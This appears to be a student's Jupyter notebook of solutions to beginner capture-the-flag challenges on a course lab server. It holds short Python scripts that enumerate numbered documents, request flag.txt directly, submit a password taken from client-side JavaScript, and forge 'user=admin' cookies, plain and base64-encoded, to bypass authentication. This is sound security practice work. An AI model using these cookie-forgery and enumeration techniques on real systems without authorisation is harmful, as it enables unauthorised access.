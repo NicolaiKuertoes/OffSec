{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "a3ff4a73",
   "metadata": {},
   "source": [
    "# OffSec Week0 -- Solutions"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "484c9fe5",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests as req\n",
    "import re\n",
    "import base64"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2f87544c",
   "metadata": {},
   "source": [
    "### OhCanada [100 points]"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d3343fab",
   "metadata": {},
   "source": [
    "Wrote a simple script to find downloadable document-files and downloaded them to a folder."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "21e1628b",
   "metadata": {},
   "outputs": [],
   "source": [
    "url = 'http://hackfest.redrocket.club:31000/docs/document_{:03d}.pdf'\n",
    "\n",
    "files = 1 # 300\n",
    "\n",
    "print('Looking for files to download...')\n",
    "count = 0\n",
    "for i in range(files):\n",
    "    res = req.get(url.format(i))\n",
    "    if res.status_code == 200:\n",
    "        count += 1\n",
    "        #print('\\tdownloading \"document_{:03d}.pdf\"'.format(i))\n",
    "        #open('./documents/document_{:03d}.pdf'.format(i), 'wb').write(res.content)\n",
    "print('>> ' + str(files) + ' files found')\n",
    "    "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b5cefbb5",
   "metadata": {},
   "source": [
    "Looked trough all the thumbnails of he downloaded files and found \"document_255.pdf\" due to it's different look which contained the flag{...}."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c14aad9b",
   "metadata": {},
   "source": [
    "### GPU [100 points]"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "582a460f",
   "metadata": {},
   "source": [
    "Read the code and saw, that the flag.txt sits in the same directory as the index.php file. Simply requested the flag.txt instead of the index.php file."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "416434f0",
   "metadata": {},
   "outputs": [],
   "source": [
    "url = 'http://hackfest.redrocket.club:2000/'\n",
    "file = 'flag.txt'\n",
    "\n",
    "res = req.get(url + file)\n",
    "\n",
    "print(res.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f61ea9d6",
   "metadata": {},
   "source": [
    "### JSLOVE [100 points]"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1170c6ea",
   "metadata": {},
   "source": [
    "Installed node.js to run the script on my machine and simply appended the following line to write the generated password off the console."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1f3d24e1",
   "metadata": {},
   "source": [
    "```js\n",
    "console.log(\"passwd_\" + generatePw());\n",
    ">> passwd_undefined\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "28b8ad5d",
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "url = 'http://hackfest.redrocket.club:31001/'\n",
    "payload = {'passwd':'passwd_undefined'}\n",
    "\n",
    "res = req.get(url, params=payload)\n",
    "print('flag{' + re.search(r\"\\{([A-Za-z0-9_]+)\\}\", res.text).group(1) + '}')"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4e9325b2",
   "metadata": {},
   "source": [
    "### Sess1 [50 points]"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c63383de",
   "metadata": {},
   "source": [
    "Simply set a cookie['user']='admin'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4054cff1",
   "metadata": {},
   "outputs": [],
   "source": [
    "url = 'http://hackfest.redrocket.club:2004/'\n",
    "cookie = {'user':'admin'}\n",
    "\n",
    "res = req.get(url, cookies=cookie)\n",
    "\n",
    "print('flag{' + re.search(r\"\\{([A-Za-z0-9_]+)\\}\", res.text).group(1) + '}')"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ffdb9e43",
   "metadata": {},
   "source": [
    "### Sess2 [75 points]"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7dc69712",
   "metadata": {},
   "source": [
    "Did the same exact thing as in <b>Sess1</b> just with the base64-encoded value of \"admin\" --> \"YWRtaW4=\"."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6da0c684",
   "metadata": {},
   "outputs": [],
   "source": [
    "url = 'http://hackfest.redrocket.club:2005/'\n",
    "\n",
    "# encode \"admin\" with base64\n",
    "value = 'admin'\n",
    "admin = base64.b64encode(value.encode('ascii')).decode('ascii')\n",
    "\n",
    "cookie = {'user':admin}\n",
    "\n",
    "res = req.get(url, cookies=cookie)\n",
    "\n",
    "print('flag{' + re.search(r\"\\{([A-Za-z0-9_]+)\\}\", res.text).group(1) + '}')"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "45978aa4",
   "metadata": {},
   "source": [
    "### REGEX [150 points]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "04a556a2",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
